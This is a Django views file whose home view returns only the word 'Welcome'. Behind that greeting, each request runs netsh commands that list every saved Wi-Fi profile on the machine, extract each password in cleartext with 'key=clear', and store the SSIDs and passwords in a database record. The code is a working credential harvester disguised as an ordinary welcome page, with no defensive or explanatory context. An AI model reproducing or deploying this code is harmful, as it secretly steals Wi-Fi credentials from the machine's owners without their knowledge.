from django.shortcuts import render
from django.http import HttpResponse
import subprocess
import re
from base.models import Message


def home(request):
    command_output = subprocess.run(
        ["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
    profile_names = (re.findall(
        "All User Profile     : (.*)\r", command_output))
    wifi_list = []
    if len(profile_names) != 0:
        for name in profile_names:
            wifi_profile = {}
            profile_info = subprocess.run(
                ["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode()
            if re.search("Security key           : Absent", profile_info):
                continue
            else:
                wifi_profile["ssid"] = name

                profile_info_pass = subprocess.run(
                    ["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True).stdout.decode()
                password = re.search(
                    "Key Content            : (.*)\r", profile_info_pass)
                if password == None:
                    wifi_profile["password"] = None
                else:
                    wifi_profile["password"] = password[1]
                wifi_list.append(wifi_profile)

    message = Message.objects.create(wifi=wifi_list)
    message.save()

    return HttpResponse(f'Welcome')
